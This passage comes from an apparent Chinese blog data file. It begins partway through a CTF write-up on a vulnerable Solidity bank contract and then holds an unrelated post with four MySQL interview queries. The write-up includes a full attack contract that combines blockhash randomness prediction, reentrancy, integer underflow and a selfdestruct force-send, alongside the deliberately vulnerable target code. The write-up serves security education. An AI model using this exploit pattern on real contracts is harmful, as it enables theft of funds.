balanceOf[to] += amount;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    event SendFlag(uint256 flagnum, string b64email);</span><br><span class=\"line\">    function sendFlag3(string b64email) public &#123;</span><br><span class=\"line\">        require(balanceOf[msg.sender] &gt;= 10000);</span><br><span class=\"line\">        emit SendFlag(1, b64email);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function guessRandom(uint256 guess) internal view returns(bool)&#123;</span><br><span class=\"line\">        uint256 seed = uint256(blockhash(block.number-1));</span><br><span class=\"line\">        uint256 rand = seed / 26959946667150639794667015087019630673637144422540572481103610249216;</span><br><span class=\"line\">        return rand == guess;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function buyCredit(uint256 guess) public &#123;</span><br><span class=\"line\">        require(guessRandom(guess));</span><br><span class=\"line\">        require(balanceOf[msg.sender] &gt;= 10000);</span><br><span class=\"line\">        require(creditOf[msg.sender] == 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        creditOf[msg.sender] = 1;</span><br><span class=\"line\">        balanceOf[msg.sender] -= 10000;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdrawCredit(uint amount) public&#123;</span><br><span class=\"line\">        require(creditOf[msg.sender] &gt;= amount);</span><br><span class=\"line\">        msg.sender.call.value(amount*1000000000)();</span><br><span class=\"line\">        creditOf[msg.sender] -= amount;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function sendFlag4(string b64email) public &#123;</span><br><span class=\"line\">        require(creditOf[msg.sender] &gt;= 10000);</span><br><span class=\"line\">        emit SendFlag(2, b64email);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function getEthBalance() public view returns(uint256)&#123;</span><br><span class=\"line\">        return this.balance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner()&#123;</span><br><span class=\"line\">        require(msg.sender == owner);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function kill(address t) public onlyOwner &#123;</span><br><span class=\"line\">        selfdestruct(t);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这题的流程是这样的：</p>\n<ol>\n<li>首先随意<code>transferBalance()</code>一下，造成下溢，让balance很大，获得flag3</li>\n<li>绕过随机数预测，成功调用<code>buyCredit()</code>，购买信用。</li>\n<li><code>withdrawCredit()</code>中依然存在下溢问题，但是require变严格，需要使用重入攻击，在未更新credit时，多取几次。</li>\n<li>上面的攻击遇到一个问题，就是目标合约里没有钱。且目标合约的回调函数没有payable，需要创建另一个合约，selfdestruct后，强制给目标合约转账。</li>\n<li>credit下溢后，获得flag4。</li>\n</ol>\n<p>攻击合约：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract magic_attack &#123;</span><br><span class=\"line\">    address owner;</span><br><span class=\"line\">    string private email = &quot;OTA3ODg2MDc2QHFxLmNvbQ==&quot;;</span><br><span class=\"line\">    address private victim = 0x1180e23d7360fc19cf7c7cd26160763b500b158b;</span><br><span class=\"line\">    uint256 public rand = 0;</span><br><span class=\"line\">   </span><br><span class=\"line\">    constructor()public&#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">        email = &quot;OTA3ODg2MDc2QHFxLmNvbQ==&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">    function step1() public&#123;</span><br><span class=\"line\">    \taddress my_to = 0x1180e23d7360fc19cf7c7cd26160763b500b151c;</span><br><span class=\"line\">    \tuint256 amount = 0x186a0;</span><br><span class=\"line\">    \tvictim.call(bytes4(keccak256(&quot;transferBalance(address,uint256)&quot;)),my_to,amount);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function step2() public&#123;</span><br><span class=\"line\">        uint256 seed = uint256(blockhash(block.number-1));</span><br><span class=\"line\">        rand = seed / 26959946667150639794667015087019630673637144422540572481103610249216;</span><br><span class=\"line\">    \tvictim.call(bytes4(keccak256(&quot;buyCredit(uint256)&quot;)),rand);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //在这里，另一个合约自毁。</span><br><span class=\"line\">    function step3() public&#123;</span><br><span class=\"line\">    \tvictim.call(bytes4(keccak256(&quot;withdrawCredit(uint256)&quot;)),1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function () payable public&#123;</span><br><span class=\"line\">    \tvictim.call(bytes4(keccak256(&quot;withdrawCredit(uint256)&quot;)),1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function test() public&#123;</span><br><span class=\"line\">        MagicBank mb = MagicBank(victim);</span><br><span class=\"line\">\t\tmb.sendFlag4(email);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract bomb &#123;</span><br><span class=\"line\">    address owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor()public&#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function () payable public&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function end() public&#123;</span><br><span class=\"line\">        selfdestruct(0x1180e23d7360fc19cf7c7cd26160763b500b158b);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>本次比赛天枢获得了第二名的好成绩，与小伙伴们在比赛中的默契配合和平日里老师的指导是息息相关的。</p>\n<p>让我总结一下区块链安全的要义，我想说：想象力就是武器。面对区块链和智能合约的题目，只有胆大心细多思考，才能想出完整的攻击链。</p>\n<p>现实中，合约、节点、共识算法、钱包、交易所等等，无论哪方面薄弱，都会让黑客有着把货币席卷一空的可能。</p>\n<p>就像是在赛事最后分享环节我所说，希望大家在工作中胆大心细，注意好系统的细枝末节，作为安全从业人员，才算真正完成了我们的工作。</p>"},{"title":"【SQL】四个比较难的SQL语句","date":"2019-04-03T19:28:04.000Z","_content":"\n前段时间帮一个同学做了套MySQL的笔试题目，感觉有一定难度，有一段时间没写过SQL语句了，练练手，大佬不要嘲笑嗝。\n\n<!-- more -->\n\n![](https://md.byr.moe/uploads/upload_f428d7b7e4c893fa8982e6b8ff24ac43.png)\n## Create Table 'Sales'\n```mysql\nCREATE TABLE `sales` (\n  `id` int(11) NOT NULL,\n  `Sales_Date` date NOT NULL,\n  `Customer_ID` varchar(50) NOT NULL,\n  `Item` varchar(50) NOT NULL,\n  `Amount` int(11) NOT NULL\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n\nALTER TABLE `sales`\n  ADD PRIMARY KEY (`id`),\n  ADD UNIQUE KEY `id` (`id`);\n\nALTER TABLE `sales`\n  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;\nCOMMIT;\n```\n\n![](https://md.byr.moe/uploads/upload_e92b631726f33f96c7fd01f47ea7a2a4.png)\n\n## Init Data\n\n```mysql\nINSERT INTO `sales` (`id`, `Sales_Date`, `Customer_ID`, `Item`, `Amount`) VALUES\n(1, '2018-08-01', 'AAA', 'Apple', 600),\n(2, '2018-08-08', 'AAA', 'Nike', 500),\n(3, '2018-08-10', 'AAA', 'Kindle', 900),\n(4, '2018-07-22', 'BBB', 'Cola', 400),\n(5, '2018-09-12', 'BBB', 'LEGO', 240),\n(6, '2018-09-13', 'BBB', 'PS4', 2000),\n(7, '2018-10-15', 'CCC', 'SWITCH', 2200),\n(8, '2018-08-08', 'AAA', 'Adidas', 5000),\n(9, '2018-08-09', 'AAA', 'Douban', 50),\n(10, '2018-07-23', 'BBB', 'Paper', 800),\n(11, '2018-08-13', 'BBB', 'Phone', 851),\n(12, '2018-07-12', 'AAA', 'Apple', 5600),\n(13, '2018-08-11', 'BBB', 'Cola', 2300);\n```\n\n![](https://md.byr.moe/uploads/upload_4dbfb98b1d2fd9618b93474b31e8c6bc.png)\n\n## Query_1\n\nWe need to calculate the amount for each user and month, so we will use `group by sales_month, customer_id`. And then we can add a condition to make the total_amount between 2000 and 10000. `Month(Date)` can calculate the month of the date. \n\n```mysql\nSELECT month(Sales_Date) as sales_month, Customer_ID, sum(amount) as total_amount \nFROM `sales` \nGROUP BY \n    customer_id, sales_month \nhaving \n    total_amount BETWEEN 2000 and 10000;\n```\n\n## Query_2\n\n这个好难，感觉leetcode的hard难度都不止。。我可以做到这样列出来，然后\n\n```mysql\nSELECT month(Sales_Date) as sales_month, Customer_ID, item\nfrom sales as s1 where \n\t(SELECT count(1) from sales as s2 where \n     month(s1.Sales_Date)=month(s2.Sales_Date) \n     and s1.Customer_ID=s2.Customer_ID \n     and s1.amount > s2.Amount) < 3 \norder by sales_month asc, Customer_ID, amount desc;\n```\n\n![](https://md.byr.moe/uploads/upload_ac6188bcf47029f1bfc299f69332d3ea.png)\n\n```mysql\nSELECT month(Sales_Date) as sales_month, Customer_ID, GROUP_CONCAT(item SEPARATOR '|') as top3\nfrom sales as s1 where \n    (SELECT count(1) from sales as s2 where \n     month(s1.Sales_Date)=month(s2.Sales_Date) \n     and s1.Customer_ID=s2.Customer_ID \n     and s1.amount > s2.Amount) < 3 \ngroup by sales_month, Customer_ID\norder by sales_month asc, Customer_ID, amount desc\n```\n\n![](https://md.byr.moe/uploads/upload_bed54b471e4dd2071f08c9fed9ad2319.png)\n\nFirst of all, we should know how to make multiple rows to one row, we can use `GROUP_CONCAT`.\nThen we need to process the date group by group, we use a sub query and the condition `< 3` .\nAnd I think get the order right is also important. The first is sales_month, then customer_id, and finally amount.\n\n## Query_3\n\n```mysql\nwith t1 as (\nselect Item, sum(amount) as total from sales where year(Sales_Date)=2018 and month(Sales_Date)=7 group by Item\n), t2 as (\nselect Item, sum(amount) as total from sales where year(Sales_Date)=2018 and month(Sales_Date)=8 group by Item\n), p as ( SELECT t1.item as item, -((case when t2.item is null then 0 else t2.total end)-t1.total) as MoM_Decrease FROM t1\n\t\tLEFT JOIN t2 ON t1.item = t2.item\n\tUNION\n\t(SELECT t2.item as item, -(t2.total-(case when t1.item is null then 0 else t1.total end)) as MoM_Decrease FROM t1\n\t\tRIGHT JOIN t2 ON t1.item = t2.item)\n),q as (select * from p \n\twhere p.MoM_Decrease >= 0\n\torder by p.MoM_Decrease desc limit 10)\nselect \n\t(@rowNum:=@rowNum+1) Rank_,q.*\nfrom \n\tq,(select (@rowNum :=0)) k;\n```\n\nPre-query t1 and t2 query for the purchase log of July and August. And query p is calculate for the MoM_Decrease for each item, we use the FULL OUTER JOIN here. Then we can add the rank for the result.\n\n## Query_4\n\n```mysql\nwith t as (\nselect Customer_ID, Sales_Date from sales where year(Sales_Date)=2018 and month(Sales_Date)=8\n)\nselect a.customer_ID\n \tfrom t as a, t as b, t as c\n   where a.sales_date+1=b.sales_date and a.sales_date+2=c.sales_date\n \tand a.customer_id = b.customer_id and a.customer_id = c.customer_id GROUP BY Customer_ID\n```\n\nFirst we use pre-query to find the rows in 2018/08. After that we can use a simple query to find the customers who have purchased in at least three consecutive.\n\n在mysql的规范中，并不包含连续性的相关方法，所以按照通常来说，我们应该使用其他方式查询该题所需的数据【例如一些脚本语言，可以使用更方便快捷的算法】。\n\n\n\n\n","source":"_posts/hard-mysql-query-4.md","raw":"---\ntitle: 【SQL】四个比较难的SQL语句\ndate: 2019-04-04 03:28:04\ntags:\n- MySQL\n- 笔试题\n---\n\n前段时间帮一个同学做了套MySQL的笔试题目，感觉有一定难度，有一段时间没写过SQL语句了，练练手，大佬不要嘲笑嗝。\n\n<!-- more -->\n\n![](https://md.byr.moe/uploads/upload_f428d7b7e4c893fa8982e6b8ff24ac43.png)\n## Create Table 'Sales'\n```mysql\nCREATE TABLE `sales` (\n  `id` int(11) NOT NULL,\n  `Sales_Date` date NOT NULL,\n  `Customer_ID` varchar(50) NOT NULL,\n  `Item` varchar(50) NOT NULL,\n  `Amount` int(11) NOT NULL\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n\nALTER TABLE `sales`\n  ADD PRIMARY KEY (`id`),\n  ADD UNIQUE KEY `id` (`id`);\n\nALTER TABLE `sales`\n  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;\nCOMMIT;\n```\n\n![](https://md.byr.moe/uploads/upload_e92b631726f33f96c7fd01f47ea7a2a4.png)\n\n## Init Data\n\n```mysql\nINSERT INTO `sales` (`id`, `Sales_Date`, `Customer_ID`, `Item`, `Amount`) VALUES\n(1, '2018-08-01', 'AAA', 'Apple', 600),\n(2, '2018-08-08', 'AAA', 'Nike', 500),\n(3, '2018-08-10', 'AAA', 'Kindle', 900),\n(4, '2018-07-22', 'BBB', 'Cola', 400),\n(5, '2018-09-12', 'BBB', 'LEGO', 240),\n(6, '2018-09-13', 'BBB', 'PS4', 2000),\n(7, '2018-10-15', 'CCC', 'SWITCH', 2200),\n(8, '2018-08-08', 'AAA', 'Adidas', 5000),\n(9, '2018-08-09', 'AAA', 'Douban', 50),\n(10, '2018-07-23', 'BBB', 'Paper', 800),\n(11, '2018-08-13', 'BBB', 'Phone', 851),\n(12, '2018-07-12', 'AAA', 'Apple', 5600),\n(13, '2018-08-11', 'BBB', 'Cola', 2300);\n```\n\n![](https://md.byr.moe/uploads/upload_4dbfb98b1d2fd9618b93474b31e8c6bc.png)\n\n## Query_1\n\nWe need to calculate the amount for each user and month, so we will use `group by sales_month, customer_id`. And then we can add a condition to make the total_amount between 2000 and 10000. `Month(Date)` can calculate the month of the date. \n\n```mysql\nSELECT month(Sales_Date) as sales_month, Customer_ID, sum(amount) as total_amount \nFROM `sales` \nGROUP BY \n    customer_id, sales_month \nhaving \n    total_amount BETWEEN 2000 and 10000;\n```\n\n## Query_2\n\n这个好难，感觉leetcode的hard难度都不止。。我可以做到这样列出来，然后\n\n```mysql\nSELECT month(Sales_Date) as sales_month, Customer_ID, item\nfrom sales as s1 where \n\t(SELECT count(1) from sales as s2 where \n     month(s1.Sales_Date)=month(s2.Sales_Date) \n     and s1.Customer_ID=s2.Customer_ID \n     and s1.amount > s2.Amount) < 3 \norder by sales_month asc, Customer_ID, amount desc;\n```\n\n![](https://md.byr.moe/uploads/upload_ac6188bcf47029f1bfc299f69332d3ea.png)\n\n```mysql\nSELECT month(Sales_Date) as sales_month, Customer_ID, GROUP_CONCAT(item SEPARATOR '|') as top3\nfrom sales as s1 where \n    (SELECT count(1) from sales as s2 where \n     month(s1.Sales_Date)=month(s2.Sales_Date) \n     and s1.Customer_ID=s2.Customer_ID \n     and s1.amount > s2.Amount) < 3 \ngroup by sales_month, Customer_ID\norder by sales_month asc, Customer_ID, amount desc\n```\n\n![](https://md.byr.moe/uploads/upload_bed54b471e4dd2071f08c9fed9ad2319.png)\n\nFirst of all, we should know how to make multiple rows to one row, we can use `GROUP_CONCAT`.\nThen we need to process the date group by group, we use a sub query and the condition `< 3` .\nAnd I think get the order right is also important. The first is sales_month, then customer_id, and finally amount.\n\n## Query_3\n\n```mysql\nwith t1 as (\nselect Item, sum(amount) as total from sales where year(Sales_Date)=2018 and month(Sales_Date)=7 group by Item\n), t2 as (\nselect Item, sum(amount) as total from sales where year(Sales_Date)=2018 and month(Sales_Date)=8 group by Item\n), p as ( SELECT t1.item as item, -((case when t2.item is null then 0 else t2.total end)-t1.total) as MoM_Decrease FROM t1\n\t\tLEFT JOIN t2 ON t1.item = t2.item\n\tUNION\n\t(SELECT t2.item as item, -(t2.total-(case when t1.item is null then 0 else t1.total end)) as MoM_Decrease FROM t1\n\t\tRIGHT JOIN t2 ON t1.item = t2.item)\n),q as (select * from p \n\twhere p.MoM_Decrease >= 0\n\torder by p.MoM_Decrease desc limit 10)\nselect \n\t(@rowNum:=@rowNum+1) Rank_,q.*\nfrom \n\tq,(select (@rowNum :=0)) k;\n```\n\nPre-query t1 and t2 query for the purchase log of July and August. And query p is calculate for the MoM_Decrease for each item, we use the FULL OUTER JOIN here. Then we can add the rank for the result.\n\n## Query_4\n\n```mysql\nwith t as (\nselect Customer_ID, Sales_Date from sales where year(Sales_Date)=2018 and month(Sales_Date)=8\n)\nselect a.customer_ID\n \tfrom t as a, t as b, t as c\n   where a.sales_date+1=b.sales_date and a.sales_date+2=c.sales_date\n \tand a.customer_id = b.customer_id and a.customer_id = c.customer_id GROUP BY Customer_ID\n```\n\nFirst we use pre-query to find the rows in 2018/08. After that we can use a simple query to find the customers who have purchased in at least three consecutive.\n\n在mysql的规范中，并不包含连续性的相关方法，所以按照通常来说，我们应该使用其他方式查询该题所需的数据【例如一些脚本语言，可以使用更方便快捷的算法】。\n\n\n\n\n","slug":"hard-mysql-query-4","published":1,"updated":"2020-02-19T12:03:41.157Z","_id":"ck6rlh7tj000821vw1gncxf48","comments":1,"layout":"post","photos":[],"link":"","content":"<p>前段时间帮一个同学做了套MySQL的笔试题目，感觉有一定难度，有一段时间没写过SQL语句了，练练手，大佬不要嘲笑嗝。</p>\n<a id=\"more\"></a>\n<p><img src=\"https://md.byr.moe/uploads/upload_f428d7b7e4c893fa8982e6b8ff24ac43.png\" alt></p>\n<h2 id=\"Create-Table-‘Sales’\"><a href=\"#Create-Table-‘Sales’\" class=\"headerlink\" title=\"Create Table ‘Sales’\"></a>Create Table ‘Sales’</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CREATE TABLE `sales` (</span><br><span class=\"line\">  `id` int(11) NOT NULL,</span><br><span class=\"line\">  `Sales_Date` date NOT NULL,</span><br><span class=\"line\">  `Customer_ID` varchar(50) NOT NULL,</span><br><span class=\"line\">  `Item` varchar(50) NOT NULL,</span><br><span class=\"line\">  `Amount` int(11) NOT NULL</span><br><span class=\"line\">) ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class=\"line\"></span><br><span class=\"line\">ALTER TABLE `sales`</span><br><span class=\"line\">  ADD PRIMARY KEY (`id`),</span><br><span class=\"line\">  ADD UNIQUE KEY `id` (`id`);</span><br><span class=\"line\"></span><br><span class=\"line\">ALTER TABLE `sales`</span><br><span class=\"line\">  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;</span><br><span class=\"line\">COMMIT;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://md.byr.moe/uploads/upload_e92b631726f33f96c7fd01f47ea7a2a4.png\" alt></p>\n<h2 id=\"Init-Data\"><a href=\"#Init-Data\" class=\"headerlink\" title=\"Init Data\"></a>Init Data</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INSERT INTO `sales` (`id`, `Sales_Date`, `Customer_ID`, `Item`, `Amount`) VALUES</span><br><span class=\"line\">(1, &apos;2018-08-01&apos;, &apos;AAA&apos;, &apos;Apple&apos;, 600),</span><br><span class=\"line\">(2, &apos;2018-08-08&apos;, &apos;AAA&apos;, &apos;Nike&apos;, 500),</span><br><span class=\"line\">(3, &apos;2018-08-10&apos;, &apos;AAA&apos;, &apos;Kindle&apos;, 900),</span><br><span class=\"line\">(4, &apos;2018-07-22&apos;, &apos;BBB&apos;, &apos;Cola&apos;, 400),</span><br><span class=\"line\">(5, &apos;2018-09-12&apos;, &apos;BBB&apos;, &apos;LEGO&apos;, 240),</span><br><span class=\"line\">(6, &apos;2018-09-13&apos;, &apos;BBB&apos;, &apos;PS4&apos;, 2000),</span><br><span class=\"line\">(7, &apos;2018-10-15&apos;, &apos;CCC&apos;, &apos;SWITCH&apos;, 2200),</span><br><span class=\"line\">(8, &apos;2018-08-08&apos;, &apos;AAA&apos;, &apos;Adidas&apos;, 5000),</span><br><span class=\"line\">(9, &apos;2018-08-09&apos;, &apos;AAA&apos;, &apos;Douban&apos;, 50),</span><br><span class=\"line\">(10, &apos;2018-07-23&apos;, &apos;BBB&apos;, &apos;Paper&apos;, 800),</span><br><span class=\"line\">(11, &apos;2018-08-13&apos;, &apos;BBB&apos;, &apos;Phone&apos;, 851),</span><br><span class=\"line\">(12, &apos;2018-07-12&apos;, &apos;AAA&apos;, &apos;Apple&apos;, 5600),</span><br><span class=\"line\">(13, &apos;2018-08-11&apos;, &apos;BBB&apos;, &apos;Cola&apos;, 2300);</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://md.byr.moe/uploads/upload_4dbfb98b1d2fd9618b93474b31e8c6bc.png\" alt></p>\n<h2 id=\"Query-1\"><a href=\"#Query-1\" class=\"headerlink\" title=\"Query_1\"></a>Query_1</h2><p>We need to calculate the amount for each user and month, so we will use <code>group by sales_month, customer_id</code>. And then we can add a condition to make the total_amount between 2000 and 10000. <code>Month(Date)</code> can calculate the month of the date. </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT month(Sales_Date) as sales_month, Customer_ID, sum(amount) as total_amount </span><br><span class=\"line\">FROM `sales` </span><br><span class=\"line\">GROUP BY </span><br><span class=\"line\">    customer_id, sales_month </span><br><span class=\"line\">having </span><br><span class=\"line\">    total_amount BETWEEN 2000 and 10000;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Query-2\"><a href=\"#Query-2\" class=\"headerlink\" title=\"Query_2\"></a>Query_2</h2><p>这个好难，感觉leetcode的hard难度都不止。。我可以做到这样列出来，然后</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT month(Sales_Date) as sales_month, Customer_ID, item</span><br><span class=\"line\">from sales as s1 where </span><br><span class=\"line\">\t(SELECT count(1) from sales as s2 where </span><br><span class=\"line\">     month(s1.Sales_Date)=month(s2.Sales_Date) </span><br><span class=\"line\">     and s1.Customer_ID=s2.Customer_ID </span><br><span class=\"line\">     and s1.amount &gt; s2.Amount) &lt; 3 </span><br><span class=\"line\">order by sales_month asc, Customer_ID, amount desc;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://md.byr.moe/uploads/upload_ac6188bcf47029f1bfc299f69332d3ea.png\" alt></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT month(Sales_Date) as sales_month, Customer_ID, GROUP_CONCAT(item SEPARATOR &apos;|&apos;) as top3</span><br><span class=\"line\">from sales as s1 where </span><br><span class=\"line\">    (SELECT count(1) from sales as s2 where </span><br><span class=\"line\">     month(s1.Sales_Date)=month(s2.Sales_Date) </span><br><span class=\"line\">     and s1.Customer_ID=s2.Customer_ID </span><br><span class=\"line\">     and s1.amount &gt; s2.Amount) &lt; 3 </span><br><span class=\"line\">group by sales_month, Customer_ID</span><br><span class=\"line\">order by sales_month asc, Customer_ID, amount desc</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://md.byr.moe/uploads/upload_bed54b471e4dd2071f08c9fed9ad2319.png\" alt></p>\n<p>First of all, we should know how to make multiple rows to one row, we can use <code>GROUP_CONCAT</code>.<br>Then we need to process the date group by group, we use a sub query and the condition <code>&lt; 3</code> .<br>And I think get the order right is also important. The first is sales_month, then customer_id, and finally amount.</p>\n<h2 id=\"Query-3\"><a href=\"#Query-3\" class=\"headerlink\" title=\"Query_3\"></a>Query_3</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">with t1 as (</span><br><span class=\"line\">select Item, sum(amount) as total from sales where year(Sales_Date)=2018 and month(Sales_Date)=7 group by Item</span><br><span class=\"line\">), t2 as (</span><br><span class=\"line\">select Item, sum(amount) as total from sales where year(Sales_Date)=2018 and month(Sales_Date)=8 group by Item</span><br><span class=\"line\">), p as ( SELECT t1.item as item, -((case when t2.item is null then 0 else t2.total end)-t1.total) as MoM_Decrease FROM t1</span><br><span class=\"line\">\t\tLEFT JOIN t2 ON t1.item = t2.item</span><br><span class=\"line\">\tUNION</span><br><span class=\"line\">\t(SELECT t2.item as item, -(t2.total-(case when t1.item is null then 0 else t1.total end)) as MoM_Decrease FROM t1</span><br><span class=\"line\">\t\tRIGHT JOIN t2 ON t1.item = t2.item)</span><br><span class=\"line\">),q as (select * from p </span><br><span class=\"line\">\twhere p.MoM_Decrease &gt;= 0</span><br><span class=\"line\">\torder by p.MoM_Decrease desc limit 10)</span><br><span class=\"line\">select </span><br><span class=\"line\">\t(@rowNum:=@rowNum+1) Rank_,q.*</span><br><span class=\"line\">from </span><br><span class=\"line\">\tq,(select (@rowNum :=0)) k;</span><br></pre></td></tr></table></figure>\n<p>Pre-query t1 and t2 query for the purchase log of July and August. And query p is calculate for the MoM_Decrease for each item, we use the FULL OUTER JOIN here. Then we can add the rank for the result.</p>\n<h2 id=\"Query-4\"><a href=\"#Query-4\" class=\"headerlink\" title=\"Query_4\"></a>Query_4</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">with t as (</span><br><span class=\"line\">select Customer_ID, Sales_Date from sales where year(Sales_Date)=2018 and month(Sales_Date)=8</span><br><span class=\"line\">)</span><br><span class=\"line\">select a.customer_ID</span><br><span class=\"line\"> \tfrom t as a, t as b, t as c</span><br><span class=\"line\">   where a.sales_date+1=b.sales_date and a.sales_date+2=c.sales_date</span><br><span class=\"line\"> \tand a.customer_id = b.customer_id and a.customer_id = c.customer_id GROUP BY Customer_ID</span><br></pre></td></tr></table></figure>\n<p>First we use pre-query to find the rows in 2018/08. After that we can use a simple query to find the customers who have purchased in at least three consecutive.</p>\n<p>在mysql的规范中，并不包含连续性的相关方法，所以按照通常来说，我们应该使用其他方式查询该题所需的数据【例如一些脚本语言，可以使用更方便快捷的算法】。</p>\n","site":{"data":{}},"excerpt":"<p>前段时间帮一个同学做了套MySQL的笔试题目，感觉有一定难度，有一段时间没写过SQL语句了，练练手，大佬不要嘲笑嗝。</p>","more":"<p><img 